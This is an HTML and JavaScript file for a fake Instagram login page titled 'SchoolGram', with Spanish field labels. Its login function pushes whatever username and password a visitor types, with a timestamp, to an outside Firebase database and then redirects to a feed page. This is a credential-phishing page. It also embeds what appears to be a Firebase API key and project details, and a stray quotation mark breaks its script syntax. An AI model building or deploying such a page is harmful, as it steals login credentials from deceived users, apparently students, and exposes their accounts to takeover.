<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>SchoolGram</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="login-box">
  <h1 class="logo">Instagram</h1>

  <input type="text" id="username" placeholder="Teléfono, usuario o correo">
  <input type="password" id="password" placeholder="Contraseña">

  <button onclick="login()">Iniciar sesión</button>
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyDBHzdR76WgkaKNrV42jhyh8pfawCqb2pg",
  authDomain: "smarthelpcetis.firebaseapp.com",
  databaseURL: "https://smarthelpcetis-default-rtdb.firebaseio.com"",
  projectId: "smarthelpcetis",
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

function login() {
  let user = document.getElementById("username").value;
  let pass = document.getElementById("password").value;

  db.ref("usuarios").push({
    usuario: user,
    contraseña: pass,
    fecha: new Date().toLocaleString()
  });

  window.location.href = "feed.html";
}
</script>

</body>
</html>